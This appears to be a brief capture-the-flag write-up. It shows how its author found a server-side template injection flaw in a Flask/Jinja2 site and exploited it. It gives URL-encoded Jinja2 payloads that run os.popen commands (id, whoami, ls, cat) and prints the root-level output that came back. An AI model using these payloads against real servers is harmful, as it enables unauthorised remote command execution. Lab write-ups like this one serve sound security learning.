On the screen we see that the site is made with 

# Flask Jinja2

![[Screenshot_2023-09-17_10_09_37.png]]

This helped me a lot

https://exploit-notes.hdks.org/exploit/web/framework/python/flask-jinja2-pentesting/

On the browser I used this command to retrieve if its vulnerable to a SSTI. (SERVER SIDE TEMPLATE INJECTION)

http://206.189.23.108:30029/{{3*2}}

The browser interpreted it and retrieve me '6'

![[Screenshot_2023-09-17_10_13_21.png]]
I injected this one too

```
http://206.189.23.108:30029/%7B%7B%20request.application.__globals__.__builtins__.__import__('os').popen('id').read()%20%7D%7D
```
This was the response
```
The page 'uid=0(root) gid=0(root) groups=0(root) ' could not be found
```


Now I injected another one 

```
http://206.189.23.108:30029/%7B%7B%20request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()%20%7D%7D
```
The response was 
```
root
```

the next comand that I put was 

```
http://206.189.23.108:30029/%7B%7B%20request.application.__globals__.__builtins__.__import__('os').popen('ls').read()%20%7D%7D
```
Then i was able to see that there was a flag.txt , the next step was just put 

```
http://206.189.23.108:30029/%7B%7B%20request.application.__globals__.__builtins__.__import__('os').popen('cat fag.txt').read()%20%7D%7D
```

Finally this was the response

![[Screenshot_2023-09-17_10_37_15.png]]

Finally I did it 